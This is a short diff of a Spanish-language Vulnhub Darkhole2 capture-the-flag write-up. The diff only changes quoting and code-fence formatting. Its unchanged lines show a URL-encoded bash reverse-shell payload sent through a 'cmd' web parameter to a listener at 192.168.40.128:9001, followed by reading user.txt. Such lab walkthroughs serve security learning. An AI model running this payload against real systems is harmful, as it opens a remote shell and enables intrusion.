@@ -162,7 +162,7 @@ En formato url   &->%26  (URL encode)
 
     bash -c 'bash -i >%26 /dev/tcp/192.168.40.128/9001 0>%26
 
-Mandamos el payload cambiando id por el cofificado en URL previamente realizado en el paso anterior. 'http://127.0.0.1:9999/?cmd=id'
+Mandamos el payload cambiando id por el cofificado en URL previamente realizado en el paso anterior. http://127.0.0.1:9999/?cmd=id
   
     http://127.0.0.1:9999/?cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.40.128/9001 0>%261'
 
@@ -170,7 +170,7 @@ Obtenemos respuesta del Puerto de escucha:
 
 ![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/61540892-f8c6-4f7b-9935-4cbe60706754)
 
-~~~~
+~~~
 cd
 ls -la
 cat user.txt
